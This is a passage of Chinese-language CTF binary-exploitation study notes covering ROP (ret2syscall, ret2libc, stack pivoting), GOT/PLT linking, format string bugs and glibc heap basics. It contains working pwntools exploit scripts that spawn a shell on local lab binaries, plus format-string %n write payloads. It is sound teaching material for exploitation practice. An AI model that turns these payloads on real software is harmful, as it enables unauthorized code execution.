+<h2 id="0x03-返回导向编程ROP"><a href="#0x03-返回导向编程ROP" class="headerlink" title="0x03 返回导向编程ROP"></a>0x03 返回导向编程ROP</h2><blockquote>
+<p>ROP（Return Oriented Programming）</p>
+</blockquote>
+<h3 id="1、ret2syscall"><a href="#1、ret2syscall" class="headerlink" title="1、ret2syscall"></a>1、ret2syscall</h3><p><strong>什么是系统调用？</strong></p>
+<ul>
+<li><p>操作系统提供给用户的编程接口</p>
+</li>
+<li><p>是提供访问操作系统所管理的底层硬件的接口</p>
+</li>
+<li><p>本质上是一些内核函数代码，以规范的方式驱动硬件</p>
+</li>
+<li><p>x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用</p>
+</li>
+</ul>
+<p><strong>举例：my_puts() -&gt; write() -&gt; sys_write()</strong></p>
+<ul>
+<li><p>my_puts(“Hello world!”); </p>
+<ul>
+<li>程序 ELF 中的用户代码 </li>
+</ul>
+</li>
+<li><p>write(1, &amp;”Hello world!”, 12); </p>
+<ul>
+<li>libc 中的用户代码</li>
+</ul>
+</li>
+<li><p>[ eax = 4; ebx = 1; ecx = &amp;”Hello world!”; edx = 12; ] + int 0x80; =&gt; sys_write() </p>
+<ul>
+<li>Linux 内核中的内核代码</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 用于打印程序或者库文件所依赖的共享库列表。</span><br><span class="hljs-meta">$</span><span class="bash"> ldd a.out</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0xb<br>mov ebx,[&quot;/bin/sh&quot;] <br>mov ecx,0<br>mov edx,0<br>int 0x80<br>=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)<br></code></pre></td></tr></table></figure>
+<p><strong>篡改栈帧上自返回地址开始的一段区域为一系列 gadget 的地址，最终调用目标系统调用。</strong></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/1fd38b16c7e1c8b6004cd0c52ac75b7d.png" srcset="/img/loading.gif" lazyload alt="image-20220122144411306" style="zoom:50%;"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/006c15054c65897c8e094024ee8c0692.png" srcset="/img/loading.gif" lazyload alt="image-20220122144820069" style="zoom:50%;"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | head</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep eax</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;int&quot;</span></span> <br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>bin_sh = <span class="hljs-number">0x80be408</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bin_sh, int_0x80])<br><span class="hljs-comment"># payload = b&#x27;A&#x27; * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="2、动态链接过程"><a href="#2、动态链接过程" class="headerlink" title="2、动态链接过程"></a>2、动态链接过程</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/50dcd703763d01496f75accb5ad58ec1.png" srcset="/img/loading.gif" lazyload alt="image-20220410230349292" style="zoom: 60%;"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/c702b48e0b9ab154044249db358579f3.png" srcset="/img/loading.gif" lazyload alt="image-20220411133422810"></p>
+<p><strong>.got、.plt、.got.plt 三个节</strong></p>
+<ul>
+<li><p>.got</p>
+<ul>
+<li>GOT(Global Offset Table)全局偏移表。</li>
+<li>这是链接器为外部符号填充的实际偏移量。</li>
+</ul>
+</li>
+<li><p>.plt</p>
+<ul>
+<li>PLT(Procedure Linkage Table)程序链接表。</li>
+<li>作用是一个跳板，保存了某个符号在重定位表中的偏移量(用来第一次查找某个符号)和对应的 .got.plt 的对应的地址。</li>
+<li>它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么没有所需地址，触发链接器去找到所需的地址。</li>
+</ul>
+</li>
+<li>.got.plt<ul>
+<li>这个是GOT专门为PLT准备的节，保存了重定位地址。</li>
+<li>.got.plt 中的值是GOT的一部分，它包含上述PLT表所需地址(已经找到的和需要去触发的)。</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/b5641f5f5523f0bfbd8100608aeedca3.png" srcset="/img/loading.gif" lazyload alt="image-20220411141334555" style="zoom: 67%;"></p>
+<ul>
+<li><p>进程首次调用 <code>foo</code></p>
+<ul>
+<li>跳转到 <code>.plt</code> 中的 <code>foo</code> 表项，<code>.plt</code> 中的代码立即跳转到 <code>.got.plt</code> 中记录的地址</li>
+<li>由于进程是第一次调用 <code>foo</code>，故 <code>.got.plt</code> 中记录的地址是 <code>foo@plt+6（push index）</code></li>
+<li>回到 <code>.plt</code> ，解析 <code>foo</code> 的实际地址</li>
+<li>跳转到 <code>.plt</code> 头部为 <code>dl_runtime_resolve</code> 函数传参，调用 <code>dl_runtime_resolve</code> 函数解析 <code>foo</code> 的实际地址</li>
+<li><code>foo</code> 的实际地址被填入 <code>.got.plt</code> 中，此后 <code>.got.plt</code> 中保存的是 <code>foo</code> 的真实地址</li>
+</ul>
+</li>
+<li><p>进程第二次调用 <code>foo</code></p>
+<ul>
+<li>直接自 <code>.got.plt</code> 跳转到 <code>foo</code> 的真实地址</li>
+<li>没有了第一次的解析地址过程</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/51cc039bbe87f3deb995ad9943ddf2fc.png" srcset="/img/loading.gif" lazyload alt="image-20220411141451294" style="zoom: 80%;"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gcc -fno-pie -o dyntest test.c<br><br>$ gcc -fno-pie --static -o statest test.c<br><br>$ gcc -fno-pie -g -m32 -o link dylink.c<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gdb link<br><br><span class="hljs-comment"># 查看plt、got内容</span><br>pwndbg&gt; plt<br>pwndbg&gt; got<br><br><span class="hljs-comment"># 查看内存地址中的值</span><br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br>pwndbg&gt; x/20x 0x7ffff7e65910<br>pwndbg&gt; x/20gx<br><br><span class="hljs-comment"># 反汇编</span><br>pwndbg&gt; disass 0x7ffff7e65910<br><br><span class="hljs-comment"># 有C语言代码</span><br>pwndbg&gt; b 9          <span class="hljs-comment"># 在行号9处打断点</span><br>pwndbg&gt; info b       <span class="hljs-comment"># 查看断点</span><br>pwndbg&gt; d 1          <span class="hljs-comment"># 删除编号1的断点</span><br><br>pwndbg&gt; start      <span class="hljs-comment"># 运行至main或者start处</span><br>pwndbg&gt; c          <span class="hljs-comment"># continue，继续执行</span><br>pwndbg&gt; backtrace  <span class="hljs-comment"># 函数调用栈</span><br>pwndbg&gt; <span class="hljs-built_in">return</span>     <span class="hljs-comment">#返回</span><br>pwndbg&gt; q          <span class="hljs-comment">#quit，退出 </span><br></code></pre></td></tr></table></figure>
+<h3 id="3、ret2libc"><a href="#3、ret2libc" class="headerlink" title="3、ret2libc"></a>3、ret2libc</h3><p><strong>篡改栈帧上自返回地址开始的一段区域为一系列 gadget 的地址，最终调用 libc 中的函数获取 shell</strong></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/19ab0cf25f7e2fdd20541fa96a03b157.png" srcset="/img/loading.gif" lazyload alt="image-20220416150937152"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/1c81ca0aed75a2d75d45142ff9b4f90a.png" srcset="/img/loading.gif" lazyload alt="image-20220416201555123"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><span class="hljs-comment"># bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span><br><br>bin_sh = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x8048460</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">4</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc2&quot;)</span><br><span class="hljs-comment"># buf2 = elf.symbols[&quot;buf2&quot;]</span><br><span class="hljs-comment"># gets_plt = elf.plt[&quot;gets&quot;]</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, system_plt, buf2, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>pop_ebx_ret = <span class="hljs-number">0x804843d</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<p>到目前为止我们只接触了内存空间分布已知的ROP，但在绝大部分赛题中，由于ASLR与PIE保护的开启，在发送攻击载荷（payload）之前，往往需要我们先泄露内存分布信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 注意 libc 版本问题</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&quot; : &quot;</span>)<br>libcBase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>success(<span class="hljs-string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libcBase))<br><span class="hljs-comment"># oneGadget = libcBase + 0x3a9fc</span><br><span class="hljs-comment"># payload = flat(cyclic(60),oneGadget)</span><br>payload = flat(cyclic(<span class="hljs-number">60</span>), libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>], <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ one_gadget libc-2.23.so<br></code></pre></td></tr></table></figure>
+<h3 id="4、其它的ROP技巧"><a href="#4、其它的ROP技巧" class="headerlink" title="4、其它的ROP技巧"></a>4、其它的ROP技巧</h3><p><strong>栈迁移</strong></p>
+<ul>
+<li><p>Definition：用 gadget 改变 esp 的值</p>
+</li>
+<li><p>Application</p>
+<ul>
+<li>栈溢出长度不足以使用直接 ROP</li>
+<li>栈溢出 payload 会出现空字符截断，且gadget地址含有空字符</li>
+<li>在泄露地址信息后需要新的 ROP payload</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/c44801137adffe5bc3305be656fe8953.png" srcset="/img/loading.gif" lazyload alt="image-20220416205727509" style="zoom:67%;"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/1c3ec8f61baef76c5b28e7aefd73347a.png" srcset="/img/loading.gif" lazyload alt="image-20220416205917710"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/0d6387bcf57e8e0f36b3feba2cc473e6.png" srcset="/img/loading.gif" lazyload alt="image-20220417105217094" style="zoom:80%;"></p>
+<p><strong>x64 ROP 使用 gadget 传递参数</strong></p>
+<ul>
+<li><p>pop rdi ; ret</p>
+</li>
+<li><p>pop rsi ; pop r15 ; ret ;</p>
+</li>
+<li><p>setting rdx and rcx is hard, no trivial gadgets</p>
+</li>
+<li>ret2csu</li>
+</ul>
+<p><strong>__libc_csu_init Gadgets for x64：</strong></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/90bd4f0b14c08380ca4bd454bdc34256.png" srcset="/img/loading.gif" lazyload alt="image-20220416201917558" style="zoom:80%;"></p>
+<h2 id="0x04-格式化字符串漏洞"><a href="#0x04-格式化字符串漏洞" class="headerlink" title="0x04 格式化字符串漏洞"></a>0x04 格式化字符串漏洞</h2><ul>
+<li><p>泄露栈内存</p>
+</li>
+<li><p>泄露任意地址内存</p>
+</li>
+<li>篡改栈内存</li>
+<li>篡改任意地址内存</li>
+</ul>
+<p><strong>Integer Overflow（整数溢出）</strong></p>
+<ul>
+<li><p>History</p>
+<ul>
+<li>European Space Agency spacecraft Cluster I’s satellites exploded because of integer overflow (1996)</li>
+</ul>
+</li>
+<li><p>IO2BO</p>
+<ul>
+<li>Array index out of bounds</li>
+</ul>
+</li>
+<li><p>Integer Overflow in Linux kernel</p>
+<ul>
+<li>CVE-2013-1763 Linux Kernel netlink message family number overflow</li>
+</ul>
+</li>
+<li><p>Integer Overflow vulnerability can be regarded as some kind of logic bug.</p>
+</li>
+<li><p>Integer overflow itself cannot be exploited, it is usually used to trigger buffer overflow/heap overflow or used with ROP, ret2libc, etc.</p>
+</li>
+</ul>
+<p><strong>Format String（格式化字符串）</strong></p>
+<ul>
+<li>History<ul>
+<li>Discovered and public since June 1999</li>
+<li>Shocked the security community in the second half of 2000(influenced lots of programs)</li>
+</ul>
+</li>
+<li>Format String Attacks, Newsham (2001)</li>
+<li>use %x and %n to achieve arbitrary read and write</li>
+</ul>
+<p><strong>Format String related Functions</strong></p>
+<ul>
+<li>fprintf — prints to a FILE stream</li>
+<li>printf — prints to the ‘stdout’ stream</li>
+<li>sprintf — prints into a string</li>
+<li>snprintf — prints into a string with length checking</li>
+<li>vfprintf — print to a FILE stream from a va_arg structure</li>
+<li>vprintf — prints to ‘stdout’ from a va_arg structure</li>
+<li>vsprintf — prints to a string from a va_arg structure</li>
+<li>vsnprintf — prints to a string with length checking from a va_arg structure</li>
+<li>setproctitle — set argv[]</li>
+<li>syslog — output to the syslog facility</li>
+</ul>
+<p><strong>Format String syntax</strong></p>
+<ul>
+<li><p>%s print null terminated string pointed by arg pointer</p>
+</li>
+<li><p>%x print hex value of the arg (arbitrary read)</p>
+</li>
+<li><p>%n store the bytes_written to location pointed by arg pointer</p>
+</li>
+<li><p>%hn - store 2 bytes (short integer)</p>
+</li>
+<li><p>%hhn - store 1 byte</p>
+</li>
+<li><p>%<positive integer>c print arbitrary count of chars controlled by integer</positive></p>
+<ul>
+<li>Example: %123c (filled by space)  %0512c (filled by 0)</li>
+<li>Useful to change bytes_written so far</li>
+</ul>
+</li>
+<li><p>%<positive integer>$<fmt> specify arg index</fmt></positive></p>
+<ul>
+<li>Example: %12$n</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>);<br>    <br>    <span class="hljs-keyword">int</span> a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$d&quot;</span>,a,b,c);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$n&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$n&quot;</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/199ee35257509a673c6b4e9468778695.png" srcset="/img/loading.gif" lazyload alt="image-20220418230459176" style="zoom:67%;"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/fb6fbedf97453e81fa6e77255564e5b9.png" srcset="/img/loading.gif" lazyload alt="image-20220419220930275" style="zoom:67%;"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io=process(<span class="hljs-string">&#x27;./fmtstr1&#x27;</span>)<br><br>x_addr=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x_addr)+<span class="hljs-string">b&quot;%11$n&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><br>payload = <span class="hljs-string">&quot;%9$s&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="0x05-堆利用heap"><a href="#0x05-堆利用heap" class="headerlink" title="0x05 堆利用heap"></a>0x05 堆利用heap</h2><h3 id="一、堆管理器"><a href="#一、堆管理器" class="headerlink" title="一、堆管理器"></a>一、堆管理器</h3><h4 id="1、堆概述"><a href="#1、堆概述" class="headerlink" title="1、堆概述"></a>1、堆概述</h4><p><strong>什么是堆？</strong></p>
+<ul>
+<li>是虚拟地址空间的一块连续的线性区域</li>
+<li>提供动态分配的内存，允许程序申请大小未知的内存</li>
+<li>在用户与操作系统之间，作为动态内存管理的中间人</li>
+<li>响应用户的申请内存请求， 向操作系统申请内存，然后将其返回给用户程序</li>
+<li>管理用户所释放的内存，适时归还给操作系统</li>
+</ul>
+<p><strong>各种堆管理器</strong></p>
+<blockquote>
+<p>堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。 封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效地管理由系统调用申请来的内存。</p>
+</blockquote>
+<ul>
+<li><p>dlmalloc – General purpose allocator</p>
+</li>
+<li><p>ptmalloc2 – glibc （敲黑板）</p>
+</li>
+<li><p>jemalloc – FreeBSD and Firefox</p>
+</li>
+<li><p>tcmalloc – Google</p>
+</li>
+<li>libumem – Solaris</li>
+</ul>
+<p><strong>申请内存的系统调用</strong></p>
+<ul>
+<li>brk<ul>
+<li>主线程申请空间较小时</li>
+<li>在 Data 段上方申请空间</li>
+</ul>
+</li>
+<li>mmap<ul>
+<li>主线程申请空间较大时、子线程申请时</li>
+<li>在 Memory map 段申请空间</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/e527cd2b75b5b89d8bb3455fba45c300.png" srcset="/img/loading.gif" lazyload alt="image-20220419223255874" style="zoom:67%;"></p>
+<h4 id="2、Areana"><a href="#2、Areana" class="headerlink" title="2、Areana"></a>2、Areana</h4><p><strong>arena</strong></p>
+<ul>
+<li><p>内存分配区，可以理解为堆管理器所持有的内存池</p>
+</li>
+<li><p>操作系统 —&gt; 堆管理器 —&gt; 用户<br>物理内存 —&gt; arena —&gt; 可用内存</p>
+</li>
+<li><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存</p>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/ea35937bebf785c1595dd9aac3901830.png" srcset="/img/loading.gif" lazyload alt="image-20220419230423543" style="zoom:80%;"></p>
+<h4 id="3、Chunk"><a href="#3、Chunk" class="headerlink" title="3、Chunk"></a>3、Chunk</h4><p><strong>chunk</strong></p>
+<ul>
+<li><p>用户申请内存的单位，也是堆管理器管理内存的基本单位</p>
+</li>
+<li><p><code>malloc()</code> 返回的指针指向一个 chunk 的数据区域</p>
+</li>
+</ul>
+<p><strong>chunk 在 glic 中的实现</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>    INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>    INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>    <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span 